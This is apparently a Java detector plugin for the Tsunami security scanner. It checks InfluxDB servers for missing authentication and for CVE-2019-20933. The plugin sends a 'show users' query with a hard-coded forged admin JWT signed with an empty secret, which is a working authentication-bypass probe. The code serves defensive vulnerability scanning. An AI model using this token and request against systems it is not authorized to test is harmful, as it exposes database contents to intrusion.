/*
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.cves.cve201920933;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.net.HttpHeaders.ACCEPT_LANGUAGE;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
import static com.google.common.net.HttpHeaders.UPGRADE_INSECURE_REQUESTS;
import static com.google.tsunami.common.data.NetworkEndpointUtils.toUriAuthority;
import static com.google.tsunami.common.net.http.HttpRequest.post;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.AdditionalDetail;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionReportList.Builder;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.TextData;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import javax.inject.Inject;

/**
 * A {@link VulnDetector} that detects the CVE-2019-20933 & missing auth vulnerability in InfluxDB.
 */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "Cve201920933VulnDetector",
    version = "0.1",
    description =
        "CVE-2019-20933: InfluxDB before 1.7.6 has an authentication bypass vulnerability because a"
            + " JWT token may have an empty SharedSecret (aka shared secret). Missing auth:"
            + " authentication is not enabled for InfluxDB",
    author = "Secureness",
    bootstrapModule = Cve201920933DetectorBootstrapModule.class)
public final class Cve201920933VulnDetector implements VulnDetector {

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  @VisibleForTesting static final String VULNERABLE_PATH = "query";
  @VisibleForTesting static final String DETECTION_STRING_1 = "results";
  @VisibleForTesting static final String DETECTION_STRING_BY_HEADER_NAME_1 = "X-Influxdb-Version";
  @VisibleForTesting static final String DETECTION_STRING_BY_HEADER_NAME_2 = "X-Influxdb-Build";
  @VisibleForTesting static final int DETECTION_STRING_BY_STATUS = HttpStatus.OK.code();
  private final HttpClient httpClient;

  private final Clock utcClock;

  @Inject
  Cve201920933VulnDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.httpClient = checkNotNull(httpClient);
    this.utcClock = checkNotNull(utcClock);
  }

  private static StringBuilder buildTarget(NetworkService networkService) {
    StringBuilder targetUrlBuilder = new StringBuilder();
    if (NetworkServiceUtils.isWebService(networkService)) {
      targetUrlBuilder.append(NetworkServiceUtils.buildWebApplicationRootUrl(networkService));
    } else {
      targetUrlBuilder
          .append("http://")
          .append(toUriAuthority(networkService.getNetworkEndpoint()))
          .append("/");
    }
    return targetUrlBuilder;
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("CVE-2019-20933 starts detecting.");
    Builder detectionReport = DetectionReportList.newBuilder();
    matchedServices.stream()
        .filter(NetworkServiceUtils::isWebService)
        .forEach(
            networkService -> {
              if (isServiceVulnerableByMissingAuth(networkService)) {
                detectionReport.addDetectionReports(
                    buildMissingAuthDetectionReport(targetInfo, networkService));
              } else if ((isServiceVulnerableByCve201920933(networkService))) {
                detectionReport.addDetectionReports(
                    buildCve201920933DetectionReport(targetInfo, networkService));
              }
            });
    return detectionReport.build();
  }

  private boolean isServiceVulnerableByCve201920933(NetworkService networkService) {

    HttpHeaders httpHeaders =
        HttpHeaders.builder()
            .addHeader(CONTENT_TYPE, "application/x-www-form-urlencoded")
            .addHeader(
                "Authorization",
                "Bearer"
                    + " eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzk1MjMzMjY3fQ.u8VkK_D8ERfgYAKoo8E0Llri1HdrEU0ml6Q0_YEx9fI")
            .addHeader(UPGRADE_INSECURE_REQUESTS, "1")
            .addHeader(ACCEPT_LANGUAGE, "en-US,en;q=0.5")
            .build();

    return canExecuteDbQuery(httpHeaders, networkService);
  }

  private boolean isServiceVulnerableByMissingAuth(NetworkService networkService) {

    HttpHeaders httpHeaders =
        HttpHeaders.builder()
            .addHeader(CONTENT_TYPE, "application/x-www-form-urlencoded")
            .addHeader(UPGRADE_INSECURE_REQUESTS, "1")
            .addHeader(ACCEPT_LANGUAGE, "en-US,en;q=0.5")
            .build();
    return canExecuteDbQuery(httpHeaders, networkService);
  }

  private boolean canExecuteDbQuery(HttpHeaders httpHeaders, NetworkService networkService) {
    String targetVulnerabilityUrl = buildTarget(networkService).append(VULNERABLE_PATH).toString();
    try {
      HttpResponse httpResponse =
          httpClient.send(
              post(targetVulnerabilityUrl)
                  .setHeaders(httpHeaders)
                  .setRequestBody(ByteString.copyFromUtf8("q=show+users"))
                  .build(),
              networkService);
      if (httpResponse.status().code() != DETECTION_STRING_BY_STATUS
          || httpResponse.bodyString().isEmpty()) {
        return false;
      }
      if (httpResponse.headers().get(DETECTION_STRING_BY_HEADER_NAME_1).isPresent()
          || httpResponse.headers().get(DETECTION_STRING_BY_HEADER_NAME_2).isPresent()) {
        if (httpResponse.bodyString().get().contains(DETECTION_STRING_1)) {
          return true;
        }
      }
    } catch (IOException | AssertionError e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
      return false;
    }
    return false;
  }

  private DetectionReport buildCve201920933DetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE_2019_20933"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("InfluxDB Empty JWT Secret Key Authentication Bypass")
                .setDescription(
                    "InfluxDB before 1.7.6 has an authentication bypass vulnerability because a JWT"
                        + " token may have an empty SharedSecret (aka shared secret).")
                .setRecommendation("Upgrade to higher versions")
                .addAdditionalDetails(
                    AdditionalDetail.newBuilder()
                        .setTextData(
                            TextData.newBuilder()
                                .setText(
                                    "Attacker can run arbitrary queries and access database"
                                        + " data"))))
        .build();
  }

  private DetectionReport buildMissingAuthDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("MISSING_AUTHENTICATION_FOR_INFLUX_DB"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("InfluxDB instance without any authentication")
                .setDescription(
                    "Attacker can access any DB information for this InfluxDB instance because"
                        + " there are no authentication.")
                .setRecommendation(
                    "Set authentication value to true in InfluxDB setup config file before running"
                        + " an instance of InfluxDB.")
                .addAdditionalDetails(
                    AdditionalDetail.newBuilder()
                        .setTextData(
                            TextData.newBuilder()
                                .setText(
                                    "Attacker can run arbitrary queries and access database"
                                        + " data"))))
        .build();
  }
}
